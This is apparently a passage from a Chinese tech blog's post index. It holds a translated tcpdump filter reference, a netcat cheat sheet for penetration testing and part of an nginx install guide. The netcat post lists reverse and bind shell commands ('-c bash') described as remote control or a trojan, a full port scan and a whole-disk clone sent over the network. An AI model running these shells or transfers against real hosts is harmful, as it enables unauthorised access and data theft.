ehost\n\n如果数据包的以太网源地址是ehost, 则与此对应的条件表达式为真.\n\n## ether host ehost\n\n如果数据包的以太网源地址或目标地址是ehost, 则与此对应的条件表达式为真.\n\n## gateway host\n\n如果数据包的网关地址是host, 则与此对应的条件表达式为真. 需要注意的是, 这里的网关地址是指以太网地址, 而不是IP 地址(nt | rt: I.e., 例如, 可理解为'注意'.the Ethernet source or destination address, 以太网源和目标地址, 可理解为, 指代上句中的'网关地址' ).host 必须是名字而不是数字, 并且必须在机器的'主机名-ip地址'以及'主机名-以太地址'两大映射关系中 有其条目(前一映射关系可通过/etc/hosts文件, DNS 或 NIS得到, 而后一映射关系可通过/etc/ethers 文件得到. nt: /etc/ethers并不一定存在 , 可通过man ethers 看到其数据格式, 如何创建该文件, 未知,需补充).也就是说host 的含义是 ether host ehost 而不是 host host, 并且ehost必须是名字而不是数字.\n目前, 该选项在支持IPv6地址格式的配置环境中不起作用(nt: configuration, 配置环境, 可理解为,通信双方的网络配置).\n\n## dst net net\n\n如果数据包的目标地址(IPv4或IPv6格式)的网络号字段为 net, 则与此对应的条件表达式为真.net 可以是从网络数据库文件/etc/networks 中的名字, 也可以是一个数字形式的网络编号.\n\n一个数字IPv4 网络编号将以点分四元组(比如, 192.168.1.0), 或点分三元组(比如, 192.168.1 ), 或点分二元组(比如, 172.16), 或单一单元组(比如, 10)来表达;\n\n对应于这四种情况的网络掩码分别是:四元组:255.255.255.255(这也意味着对net 的匹配如同对主机地址(host)的匹配:地址的四个部分都用到了),三元组:255.255.255.0, 二元组: 255.255.0.0, 一元组:255.0.0.0.\n\n对于IPv6 的地址格式, 网络编号必须全部写出来(8个部分必须全部写出来); 相应网络掩码为:ff:ff:ff:ff:ff:ff:ff:ff, 所以IPv6 的网络匹配是真正的'host'方式的匹配(nt | rt | rc:地址的8个部分都会用到,是否不属于网络的字节填写0, 需接下来补充), 但同时需要一个网络掩码长度参数来具体指定前面多少字节为网络掩码(nt: 可通过下面的net net/len 来指定)\n\n## src net net\n\n如果数据包的源地址(IPv4或IPv6格式)的网络号字段为 net, 则与此对应的条件表达式为真.\n\n## net net\n\n如果数据包的源或目的地址(IPv4或IPv6格式)的网络号字段为 net, 则与此对应的条件表达式为真.\n\n## net net mask netmask\n\n如果数据包的源或目的地址(IPv4或IPv6格式)的网络掩码与netmask 匹配, 则与此对应的条件表达式为真.此选项之前还可以配合src和dst来匹配源网络地址或目标网络地址(nt: 比如 src net net mask 255.255.255.0).该选项对于ipv6 网络地址无效.\n\n## net net/len\n\n如果数据包的源或目的地址(IPv4或IPv6格式)的网络编号字段的比特数与len相同, 则与此对应的条件表达式为真.此选项之前还可以配合src和dst来匹配源网络地址或目标网络地址(nt | rt | tt: src net net/24, 表示需要匹配源地址的网络编号有24位的数据包).\n\n## dst port port\n\n如果数据包(包括ip/tcp, ip/udp, ip6/tcp or ip6/udp协议)的目的端口为port, 则与此对应的条件表达式为真.port 可以是一个数字也可以是一个名字(相应名字可以在/etc/services 中找到该名字, 也可以通过man tcp 和man udp来得到相关描述信息 ). 如果使用名字, 则该名字对应的端口号和相应使用的协议都会被检查. 如果只是使用一个数字端口号,则只有相应端口号被检查(比如, dst port 513 将会使tcpdump抓取tcp协议的login 服务和udp协议的who 服务数据包, 而port domain 将会使tcpdump 抓取tcp协议的domain 服务数据包, 以及udp 协议的domain 数据包)(nt | rt: ambiguous name is used 不可理解, 需补充).\n\n## src port port\n\n如果数据包的源端口为port, 则与此对应的条件表达式为真.\n\n## port port\n\n如果数据包的源或目的端口为port, 则与此对应的条件表达式为真.\n\n## dst portrange port1-port2\n\n如果数据包(包括ip/tcp, ip/udp, ip6/tcp or ip6/udp协议)的目的端口属于port1到port2这个端口范围(包括port1, port2), 则与此对应的条件表达式为真. tcpdump 对port1 和port2 解析与对port 的解析一致(nt:在dst port port 选项的描述中有说明).\n\n## src portrange port1-port2\n\n如果数据包的源端口属于port1到port2这个端口范围(包括 port1, port2), 则与此对应的条件表达式为真.\n\n## portrange port1-port2\n\n如果数据包的源端口或目的端口属于port1到port2这个端口范围(包括 port1, port2), 则与此对应的条件表达式为真.\n\n以上关于port 的选项都可以在其前面添加关键字:tcp 或者udp, 比如:\n```\ntcp src port port\n```\n这将使tcpdump 只抓取源端口是port 的tcp数据包.\n\n## less length\n如果数据包的长度比length 小或等于length, 则与此对应的条件表达式为真. 这与`len <= length`  的含义一致. greater length如果数据包的长度比length 大或等于length, 则与此对应的条件表达式为真. 这与`len >= length'`的含义一致.\n\n## ip proto protocol\n\n如果数据包为ipv4数据包并且其协议类型为protocol, 则与此对应的条件表达式为真.\nProtocol 可以是一个数字也可以是名字, 比如:icmp6, igmp, igrp(nt: Interior Gateway Routing Protocol,内部网关路由协议), pim(Protocol Independent Multicast, 独立组播协议, 应用于组播路由器),ah, esp(nt: ah, 认证头, esp 安全负载封装, 这两者会用在IP包的安全传输机制中 ), vrrp(Virtual Router Redundancy Protocol, 虚拟路由器冗余协议), udp, or tcp. 由于tcp , udp 以及icmp是tcpdump 的关键字,所以在这些协议名字之前必须要用\\来进行转义(如果在C-shell 中需要用\\\\来进行转义). 注意此表达元不会把数据包中协议头链中所有协议头内容全部打印出来(nt: 实际上只会打印指定协议的一些头部信息, 比如可以用tcpdump -i eth0 'ip proto \\tcp and host 192.168.3.144', 则只打印主机192.168.3.144 发出或接收的数据包中tcp 协议头所包含的信息)\n\n## ip6 proto protocol\n\n如果数据包为ipv6数据包并且其协议类型为protocol, 则与此对应的条件表达式为真.\n注意此表达元不会把数据包中协议头链中所有协议头内容全部打印出来\n\n## ip6 protochain protocol\n\n如果数据包为ipv6数据包并且其协议链中包含类型为protocol协议头, 则与此对应的条件表达式为真. 比如,ip6 protochain 6\n\n将匹配其协议头链中拥有TCP 协议头的IPv6数据包.此数据包的IPv6头和TCP头之间可能还会包含验证头, 路由头, 或者逐跳寻径选项头.\n\n由此所触发的相应BPF(Berkeley Packets Filter, 可理解为, 在数据链路层提供数据包过滤的一种机制)代码比较繁琐,并且BPF优化代码也未能照顾到此部分, 从而此选项所触发的包匹配可能会比较慢.\n\n## ip protochain protocol\n与ip6 protochain protocol 含义相同, 但这用在IPv4数据包.\n\n## ether broadcast\n如果数据包是以太网广播数据包, 则与此对应的条件表达式为真. ether 关键字是可选的.\n\n## ip broadcast\n\n如果数据包是IPv4广播数据包, 则与此对应的条件表达式为真. 这将使tcpdump 检查广播地址是否符合全0和全1的一些约定,并查找网络接口的网络掩码(网络接口为当时在其上抓包的网络接口).\n\n如果抓包所在网络接口的网络掩码不合法, 或者此接口根本就没有设置相应网络地址和网络， 亦或是在linux下的'any'网络接口上抓包(此'any'接口可以收到系统中不止一个接口的数据包(nt: 实际上, 可理解为系统中所有可用的接口)),网络掩码的检查不能正常进行.\n\n\n## ether multicast\n\n如果数据包是一个以太网多点广播数据包(nt: 多点广播, 可理解为把消息同时传递给一组目的地址, 而不是网络中所有地址,后者为可称为广播(broadcast)), 则与此对应的条件表达式为真. 关键字ether 可以省略. 此选项的含义与以下条件表达式含义一致:`ether[0] & 1 != 0'(nt: 可理解为, 以太网数据包中第0个字节的最低位是1, 这意味这是一个多点广播数据包).\n\n## ip multicast\n\n如果数据包是ipv4多点广播数据包, 则与此对应的条件表达式为真.\n\n## ip6 multicast\n\n如果数据包是ipv6多点广播数据包, 则与此对应的条件表达式为真.\n\n## ether proto protocol\n\n如果数据包属于以下以太协议类型, 则与此对应的条件表达式为真.\n协议(protocol)字段, 可以是数字或以下所列出了名字: ip, ip6, arp, rarp, atalk(AppleTalk网络协议),aarp(nt: AppleTalk Address Resolution Protocol, AppleTalk网络的地址解析协议),decnet(nt: 一个由DEC公司所提供的网络协议栈), sca(nt: 未知, 需补充),lat(Local Area Transport, 区域传输协议, 由DEC公司开发的以太网主机互联协议),mopdl, moprc, iso(nt: 未知, 需补充), stp(Spanning tree protocol, 生成树协议, 可用于防止网络中产生链接循环),ipx（nt: Internetwork Packet Exchange, Novell 网络中使用的网络层协议）, 或者netbeui(nt: NetBIOS Extended User Interface，可理解为, 网络基本输入输出系统接口扩展).\n\nprotocol字段可以是一个数字或以下协议名之一:ip, ip6, arp, rarp, atalk, aarp, decnet, sca, lat,mopdl, moprc, iso, stp, ipx, 或者netbeui.\n必须要注意的是标识符也是关键字, 从而必须通过'\\'来进行转义.\n\n(SNAP：子网接入协议 （SubNetwork Access Protocol）)\n\n在光纤分布式数据网络接口(其表达元形式可以是'fddi protocol arp'), 令牌环网(其表达元形式可以是'tr protocol arp'),以及IEEE 802.11 无线局域网(其表达元形式可以是'wlan protocol arp')中, protocol标识符来自802.2 逻辑链路控制层头,在FDDI, Token Ring 或 802.1头中会包含此逻辑链路控制层头.\n\n当以这些网络上的相应的协议标识为过滤条件时, tcpdump只是检查LLC头部中以0x000000为组成单元标识符(OUI, 0x000000\n标识一个内部以太网)的一段'SNAP格式结构'中的protocol ID 域, 而不会管包中是否有一段OUI为0x000000的'SNAP格式\n结构'(nt: SNAP, SubNetwork Access Protocol,子网接入协议 ). 以下例外:\n\niso tcpdump 会检查LLC头部中的DSAP域(Destination service Access Point, 目标服务接入点)和SSAP域(源服务接入点).(nt: iso 协议未知, 需补充)\n\n## stp 以及 netbeui\n\ntcpdump 将会检查LLC 头部中的目标服务接入点(Destination service Access Point);\n\n## atalk\n\ntcpdump 将会检查LLC 头部中以0x080007 为OUI标识的'SNAP格式结构', 并会检查AppleTalk etype域.\n(nt: AppleTalk etype 是否位于SNAP格式结构中, 未知, 需补充).\n\n此外, 在以太网中, 对于ether proto protocol 选项, tcpdump 会为 protocol 所指定的协议检查\n以太网类型域(the Ethernet type field), 但以下这些协议除外:\n```\niso, stp, and netbeui\n```\ntcpdump 将会检查802.3 物理帧以及LLC 头(这两种检查与FDDI, TR, 802.11网络中的相应检查一致);\n(nt: 802.3, 理解为IEEE 802.3, 其为一系列IEEE 标准的集合. 此集合定义了有线以太网络中的物理层以及数据链路层的媒体接入控制子层. stp 在上文已有描述)\n\n## atalk\n\ntcpdump 将会检查以太网物理帧中的AppleTalk etype 域 ,　同时也会检查数据包中LLC头部中的'SNAP格式结构'(这两种检查与FDDI, TR, 802.11网络中的相应检查一致)\n\naarp tcpdump 将会检查AppleTalk ARP etype 域, 此域或存在于以太网物理帧中, 或存在于LLC(由802.2 所定义)的'SNAP格式结构'中, 当为后者时, 该'SNAP格式结构'的OUI标识为0x000000;(nt: 802.2, 可理解为, IEEE802.2, 其中定义了逻辑链路控制层(LLC), 该层对应于OSI 网络模型中数据链路层的上层部分.\n\nLLC 层为使用数据链路层的用户提供了一个统一的接口(通常用户是网络层). LLC层以下是媒体接入控制层(nt: MAC层,对应于数据链路层的下层部分).该层的实现以及工作方式会根据不同物理传输媒介的不同而有所区别(比如, 以太网, 令牌环网,光纤分布数据接口(nt: 实际可理解为一种光纤网络), 无线局域网(802.11), 等等.)\n\nipx tcpdump 将会检查物理以太帧中的IPX etype域, LLC头中的IPX DSAP域，无LLC头并对IPX进行了封装的802.3帧,以及LLC 头部'SNAP格式结构'中的IPX etype 域(nt | rt: SNAP frame, 可理解为, LLC 头中的'SNAP格式结构'.该含义属初步理解阶段, 需补充).\n\n## decnet src host\n\n如果数据包中DECNET源地址为host, 则与此对应的条件表达式为真.\n(nt:decnet, 由Digital Equipment Corporation 开发, 最早用于PDP-11 机器互联的网络协议)\n\n## decnet dst host\n\n如果数据包中DECNET目的地址为host, 则与此对应的条件表达式为真.\n(nt: decnet 在上文已有说明)\n\n## decnet host host\n\n如果数据包中DECNET目的地址或DECNET源地址为host, 则与此对应的条件表达式为真.\n(nt: decnet 在上文已有说明)\n\n## ifname interface\n\n如果数据包已被标记为从指定的网络接口中接收的, 则与此对应的条件表达式为真.\n(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))\n\n## on interface\n\n与 ifname interface 含义一致.\n\n## rnr num\n如果数据包已被标记为匹配PF的规则, 则与此对应的条件表达式为真.\n(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))\n\n## rulenum num\n\n与 rulenum num 含义一致.\n\n## reason code\n\n如果数据包已被标记为包含PF的匹配结果代码, 则与此对应的条件表达式为真.有效的结果代码有: match, bad-offset,fragment, short, normalize, 以及memory.\n(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))\n\n## rset name\n\n如果数据包已被标记为匹配指定的规则集, 则与此对应的条件表达式为真.\n(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))\n\n## ruleset name\n\n与 rset name 含义一致.\n\n## srnr num\n\n如果数据包已被标记为匹配指定的规则集中的特定规则(nt: specified PF rule number, 特定规则编号, 即特定规则),则与此对应的条件表达式为真.(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))\n\n## subrulenum num\n\n与 srnr 含义一致.\n\n## action act\n如果包被记录时PF会执行act指定的动作, 则与此对应的条件表达式为真. 有效的动作有: pass, block.(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))\n\nip, ip6, arp, rarp, atalk, aarp, decnet, iso, stp, ipx, netbeui\n\n与以下表达元含义一致:\n```\nether proto p\n```\np是以上协议中的一个.\n\nlat, moprc, mopdl\n\n与以下表达元含义一致:\n```\nether proto p\n```\np是以上协议中的一个. 必须要注意的是tcpdump目前还不能分析这些协议.\n\n## vlan [vlan_id]\n\n如果数据包为IEEE802.1Q VLAN 数据包, 则与此对应的条件表达式为真.\n(nt: IEEE802.1Q VLAN, 即IEEE802.1Q 虚拟网络协议, 此协议用于不同网络的之间的互联).如果[vlan_id] 被指定, 则只有数据包含有指定的虚拟网络id(vlan_id), 则与此对应的条件表达式为真.要注意的是, 对于VLAN数据包, 在表达式中遇到的第一个vlan关键字会改变表达式中接下来关键字所对应数据包中数据的开始位置(即解码偏移). 在VLAN网络体系中过滤数据包时, vlan [vlan_id]表达式可以被多次使用. 关键字vlan每出现一次都会增加4字节过滤偏移(nt: 过滤偏移, 可理解为上面的解码偏移).\n\n例如:\n```\nvlan 100 && vlan 200\n```\n\n表示: 过滤封装在VLAN100中的VLAN200网络上的数据包\n\n再例如:\n```\nvlan && vlan 300 && ip\n```\n表示: 过滤封装在VLAN300 网络中的IPv4数据包, 而VLAN300网络又被更外层的VLAN封装\n\n\n## mpls [label_num]\n\n如果数据包为MPLS数据包, 则与此对应的条件表达式为真.\n(nt: MPLS, Multi-Protocol Label Switch, 多协议标签交换, 一种在开放的通信网上利用标签引导数据传输的技术).\n\n如果[label_num] 被指定, 则只有数据包含有指定的标签id(label_num), 则与此对应的条件表达式为真.\n\n要注意的是, 对于内含MPLS信息的IP数据包(即MPLS数据包), 在表达式中遇到的第一个MPLS关键字会改变表达式中接下来关键字所对应数据包中数据的开始位置(即解码偏移). 在MPLS网络体系中过滤数据包时, mpls [label_num]表达式可以被多次使用. 关键字mpls每出现一次都会增加4字节过滤偏移(nt: 过滤偏移, 可理解为上面的解码偏移).\n\n例如:\n```\nmpls 100000 && mpls 1024\n```\n表示: 过滤外层标签为100000 而层标签为1024的数据包\n\n再如:\n```\nmpls && mpls 1024 && host 192.9.200.1\n```\n表示: 过滤发往或来自192.9.200.1的数据包, 该数据包的内层标签为1024, 且拥有一个外层标签.\n\n## pppoed\n\n如果数据包为PPP-over-Ethernet的服务器探寻数据包(nt: Discovery packet,\n其ethernet type 为0x8863),则与此对应的条件表达式为真.\n(nt: PPP-over-Ethernet, 点对点以太网承载协议, 其点对点的连接建立分为Discovery阶段(地址发现) 和PPPoE 会话建立阶段 , discovery 数据包就是第一阶段发出来的包. ethernet type是以太帧里的一个字段，用来指明应用于帧数据字段的协议)\n\n## pppoes\n\n如果数据包为PPP-over-Ethernet会话数据包(nt: ethernet type 为0x8864, PPP-over-Ethernet在上文已有说明, 可搜索关键字'PPP-over-Ethernet'找到其描述), 则与此对应的条件表达式为真.\n\n要注意的是, 对于PPP-over-Ethernet会话数据包, 在表达式中遇到的第一个pppoes关键字会改变表达式中接下来关键字所对应数据包中数据的开始位置(即解码偏移).\n\n例如:\n```\npppoes && ip\n```\n表示: 过滤嵌入在PPPoE数据包中的ipv4数据包\n\ntcp, udp, icmp\n\n与以下表达元含义一致:\n```\nip proto p or ip6 proto p\n```\n其中p 是以上协议之一(含义分别为: 如果数据包为ipv4或ipv6数据包并且其协议类型为 tcp,udp, 或icmp则与此对应的条件表达式为真)\n\n## iso proto protocol\n\n如果数据包的协议类型为iso-osi协议栈中protocol协议, 则与此对应的条件表达式为真.(nt: [初解]iso-osi 网络模型中每\n层的具体协议与tcp/ip相应层采用的协议不同. iso-osi各层中的具体协议另需补充 )\n\nprotocol 可以是一个数字编号, 或以下名字中之一:\n\nclnp, esis, or isis.\n\n(nt: clnp, Connectionless Network Protocol, 这是OSI网络模型中网络层协议 , esis, isis 未知, 需补充)\n\nclnp, esis, isis\n\n是以下表达的缩写\n```\niso proto p\n```\n其中p 是以上协议之一\n\n\nl1, l2, iih, lsp, snp, csnp, psnp\n\n为IS-IS PDU 类型 的缩写.\n\n(nt: IS-IS PDU, Intermediate system to intermediate system Protocol Data Unit, 中间系统到中间系统的协议数据单元. OSI(Open Systems Interconnection)网络由终端系统, 中间系统构成.\n\n终端系统指路由器, 而终端系统指用户设备. 路由器形成的本地组称之为'区域'（Area）和多个区域组成一个'域'（Domain）.\n\nIS-IS 提供域内或区域内的路由. l1, l2, iih, lsp, snp, csnp, psnp 表示PDU的类型, 具体含义另需补充)\n\n## vpi n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 ,如果数据包为ATM数据包, 并且其虚拟路径标识为n, 则与此对应的条件表达式为真.(nt: ATM, Asychronous Transfer Mode, 实际上可理解为由ITU-T(国际电信联盟电信标准化部门)提出的一个与TCP/IP中IP层功能等同的一系列协议, 具体协议层次另需补充)\n\n## vci n\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 ,如果数据包为ATM数据包, 并且其虚拟通道标识为n, 则与此对应的条件表达式为真.\n(nt: ATM, 在上文已有描述)\n\n## lane\n\n如果数据包为ATM LANE 数据包, 则与此对应的条件表达式为真. 要注意的是, 如果是模拟以太网的LANE数据包或者LANE逻辑单元控制包, 表达式中第一个lane关键字会改变表达式中随后条件的测试. 如果没有指定lane关键字, 条件测试将按照数据包中内含LLC(逻辑链路层)的ATM包来进行.\n\n## llc\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 ,如果数据包为ATM数据包,　并且内含LLC则与此对应的条件表达式为真\n\n## oamf4s\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包\n并且是Segment OAM F4 信元(VPI=0 并且 VCI=3), 则与此对应的条件表达式为真.\n\n(nt: OAM, Operation Administration and Maintenance, 操作管理和维护,可理解为:ATM网络中用于网络管理所产生的ATM信元的分类方式.\n\nATM网络中传输单位为信元, 要传输的数据终究会被分割成固定长度(53字节)的信元,\n(初理解: 一条物理线路可被复用, 形成虚拟路径(virtual path). 而一条虚拟路径再次被复用, 形成虚拟信道(virtual channel)).\n\n通信双方的编址方式为:虚拟路径编号(VPI)/虚拟信道编号(VCI)).\n\nOAM F4 flow 信元又可分为segment 类和end-to-end 类, 其区别未知, 需补充.)\n\n## oamf4e\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是 end-to-end OAM F4 信元(VPI=0 并且 VCI=4), 则与此对应的条件表达式为真.\n(nt: OAM 与 end-to-end OAM F4 在上文已有描述, 可搜索'oamf4s'来定位)\n\n## oamf4\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是 end-to-end 或 segment OAM F4 信元(VPI=0 并且 VCI=3 或者 VCI=4), 则与此对应的条件表达式为真.\n(nt: OAM 与 end-to-end OAM F4 在上文已有描述, 可搜索'oamf4s'来定位)\n\n## oam\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包\n并且是 end-to-end 或 segment OAM F4 信元(VPI=0 并且 VCI=3 或者 VCI=4), 则与此对应的条件表达式为真.\n(nt: 此选项与oamf4重复, 需确认)\n\n## metac\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包\n并且是来自'元信令线路'(nt: VPI=0 并且 VCI=1, '元信令线路', meta signaling circuit, 具体含义未知, 需补充),\n则与此对应的条件表达式为真.\n\n## bcc\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是来自'广播信令线路'(nt: VPI=0 并且 VCI=2, '广播信令线路', broadcast signaling circuit, 具体含义未知, 需补充),\n则与此对应的条件表达式为真.\n\n## sc\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是来自'信令线路'(nt: VPI=0 并且 VCI=5, '信令线路', signaling circuit, 具体含义未知, 需补充),则与此对应的条件表达式为真.\n\n## ilmic\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是来自'ILMI线路'(nt: VPI=0 并且 VCI=16, 'ILMI', Interim Local Management Interface , 可理解为基于SNMP(简易网络管理协议)的用于网络管理的接口)则与此对应的条件表达式为真.\n\n## connectmsg\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是来自'信令线路'并且是Q.2931协议中规定的以下几种消息: Setup, Calling Proceeding, Connect,Connect Ack, Release, 或者Release Done. 则与此对应的条件表达式为真.(nt: Q.2931 为ITU(国际电信联盟)制定的信令协议. 其中规定了在宽带综合业务数字网络的用户接口层建立, 维护, 取消\n网络连接的相关步骤.)\n\n## metaconnect\n\n如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是来自'元信令线路'并且是Q.2931协议中规定的以下几种消息: Setup, Calling Proceeding, Connect,Connect Ack, Release, 或者Release Done. 则与此对应的条件表达式为真.\n\n## expr relop expr\n\n如果relop 两侧的操作数(expr)满足relop 指定的关系, 则与此对应的条件表达式为真.\nrelop 可以是以下关系操作符之一: `>, <, <=, =, !=.`\nexpr 是一个算术表达式. 此表达式中可使用整型常量(表示方式与标准C中一致), 二进制操作符(+, -, *, /, &, |,<<, >>), 长度操作符, 以及对特定数据包中数据的引用操作符. 要注意的是, 所有的比较操作都默认操作数是无符号的,\n例如, 0x80000000 和 0xffffffff 都是大于0的(nt: 对于有符号的比较, 按照补码规则, 0xffffffff会小于0). 如果要引用数据包中的数据, 可采用以下表达方式:\n```\nproto [expr : size]\n```\nproto 的取值可以是以下取值之一:ether, fddi, tr, wlan, ppp, slip, link, ip, arp, rarp,tcp, udp, icmp, ip6 或者 radio. 这指明了该引用操作所对应的协议层.(ether, fddi, wlan,tr, ppp, slip and link 对应于数据链路层, radio 对应于802.11(wlan,无线局域网)某些数据包中的附带的\"radio\"头(nt: 其中描述了波特率, 数据加密等信息)).\n\n要注意的是, tcp, udp 等上层协议目前只能应用于网络层采用为IPv4或IPv6协议的网络(此限制会在tcpdump未来版本中进行修改). 对于指定协议的所需数据, 其在包数据中的偏移字节由expr 来指定.\n\n以上表达中size 是可选的, 用来指明我们关注那部分数据段的长度(nt:通常这段数据\n是数据包的一个域)， 其长度可以是1, 2, 或4个字节. 如果不给定size, 默认是1个字节. 长度操作符的关键字为len,这代码整个数据包的长度.\n\n例如, 'ether[0] & 1 != 0' 将会使tcpdump 抓取所有多点广播数据包.(nt: ether[0]字节的最低位为1表示数据包目的地址是多点广播地址). 'ip[0] & 0xf != 5' 对应抓取所有带有选项的IPv4数据包. 'ip[6:2] & 0x1fff = 0'对应抓取没被破碎的IPv4数据包或者\n其片段编号为0的已破碎的IPv4数据包. 这种数据检查方式也适用于tcp和udp数据的引用,\n即, tcp[0]对应于TCP 头中第一个字节, 而不是对应任何一个中间的字节.\n\n一些偏移以及域的取值除了可以用数字也可用名字来表达. 以下为可用的一些域(协议头中的域)的名字: icmptype (指ICMP 协议头中type域), icmpcode (指ICMP 协议头code 域), 以及tcpflags(指TCP协议头的flags 域)\n\n以下为ICMP 协议头中type 域的可用取值:\n```\nicmp-echoreply, icmp-unreach, icmp-sourcequench, icmp-redirect, icmp-echo, icmp-routeradvert,\nicmp-routersolicit, icmp-timx-ceed, icmp-paramprob, icmp-tstamp, icmp-tstampreply,\nicmp-ireq, icmp-ireqreply, icmp-maskreq, icmp-maskreply.\n```\n以下为TCP 协议头中flags 域的可用取值:tcp-fin, tcp-syn, tcp-rst, tcp-push,\ntcp-ack, tcp-urg.\n","tags":["Kali linux渗透测试"],"categories":["security"]},{"title":"netcat-nc","url":"/2017/06/16/security/netcat-nc/","content":"- 网络工工具中的瑞士士军刀刀——小小身身材、大大智慧\n- 侦听模式 / 传输模式\n- telnet / 获取banner信息\n- 传输文文本信息\n- 传输文文件/⺫目目录\n- 加密传输文文件\n- 远程控制/木木⻢马\n- 加密所有流量\n- 流媒体服务器\n- 远程克隆硬盘\n\n<!-- more -->\n\n# NC——TELNET / BANNER\n```sh\nnc –nv 1.1.1.1 110\nnc –nv 1.1.1.1 25\nnc –nv 1.1.1.1 80\n```\n# NC——传输文文本信息\n```sh\nA:nc -l -p 4444\nB:nc –nv 1.1.1.1 4444\n```\n# NC--传输文文件/目录\n## 传输文文件\n```sh\nA:nc -lp 333 > 1.mp4\nB:nc -nv 1.1.1.1 333 < 1.mp4 –q 1\n```\n或\n```sh\nA:nc -q 1 -lp 333 < a.mp4\nB: nc -nv 1.1.1.1 333 > 2.mp4\n```\n## 传输目录\n```sh\nA:tar -cvf - music/ | nc -lp 333 –q 1\nB:nc -nv 1.1.1.1 333 | tar -xvf –\n```\n## 加密传文文件\n```sh\nA:nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.mp4\nB: mcrypt --flush -Fbq -a rijndael-256 -m ecb < a.mp4 | nc -nv 1.1.1.1 333 -q 1\n```\n\n# NC--流媒体服务\n```sh\nA: cat 1.mp4 | nc -lp 333\nB: 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -\n```\n\n# NC——端口口扫描\n```sh\nnc -nvz 1.1.1.1 1-65535\nnc –vnzu 1.1.1.1 1-1024\n```\n\n# NC--远程克隆硬盘\n```sh\nA: nc -lp 333 | dd of=/dev/sda\nB: dd if=/dev/sda | nc -nv 1.1.1.1 333 –q 1\n```\n\n# NC--远程控制\n## 正向:\n```sh\nA:nc -lp 333 -c bash\nB:nc 1.1.1.1 333\n```\n## 反向:\n```sh\nA:nc -lp 333\nB:nc 1.1.1.1 333 -c bash\n```\n** 注:Windows用用户把bash改成cmd **\n\n# NC--NCAT\n- Nc缺乏加密和身身份验证的能力力\n- Ncat包含于nmap工工具包中\n```sh\nA:ncat ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl\nB:ncat -nv 1.1.1.1 333 --ssl\n```\n","tags":["Kali linux渗透测试"],"categories":["security"]},{"title":"nginx安装","url":"/2017/06/12/service/nginx安装/","content":"\n\n\n# 一. rpm包安装\n\n## 1.1 配置nginx 官方yum源用以安装最新稳定版\n\n　　用以下内容为模板，创建nginx软件源文件: “/etc/yum.repos.d/nginx.repo” \n\n```\n[nginx]\nname=nginx repo\nbaseurl=http://nginx.org/packages/OS/OSRELEASE/$basearch/\ngpgcheck=0\nenabled=1\n```\n \n　　其中“OS” 用 “centos”替代, 根据不同的系统版本， “OSRELEASE” 用“5”, “6”, 或者“7”替代\n\n　　下面给出一个范例：\n\n```\n[nginx]\nname=nginx repo\nbaseurl=http://nginx.org/packages/centos/6/$basearch/\ngpgcheck=0\nenabled=1\n```\n\n<!-- more -->\n\n## 1.2 安装nginx\n\n```sh\nsudo yum install nginx\n```\n\n# 二. 编译安装\n\n## 2.1 必要软件准备\n\n### 2.1.1 安装pcre\n\n　　为了支持rewrite功能，我们需要安装pcre\n\n```sh\nyum install pcre* //如过你已经装了，请跳过这一步\n```\n### 2.1.2 安装openssl\n\n　　需要ssl的支持，如果不需要ssl支持，请跳过这一步\n\n```sh\nyum install openssl*\n```\n\n## 2.2 安装nginx\n\n### 2.2.1 配置编译参数\n\n　　执行如下命令：\n\n```sh\n./configure --prefix=/usr/local/nginx-1.5.1 \\\n--with-http_ssl_module --with-http_spdy_module \\\n--with-http_stub_status_module --with-pcre\n```\n　　--with-http_stub_status_module：支持nginx状态查询\n\n　　--with-http_ssl_module：支持https\n\n　　--with-http_spdy_module：支持google的spdy,想了解请百度spdy,这个必须有ssl的支持\n\n　　--with-pcre：为了支持rewrite重写功能，必须制定pcre\n\n　　最后输出如下内容，表示configure OK了。\n\n\n...\n\n\n```sh\nchecking for zlib library ... found\n creating objs/Makefile\nConfiguration summary\n + using system PCRE library\n + using system OpenSSL library\n + md5: using OpenSSL library\n + sha1: using OpenSSL library\n + using system zlib library\nnginx path prefix: \"/usr/local/nginx-1.5.1\"\n nginx binary file: \"/usr/local/nginx-1.5.1/sbin/nginx\"\n nginx configuration prefix: \"/usr/local/nginx-1.5.1/conf\"\n nginx configuration file: 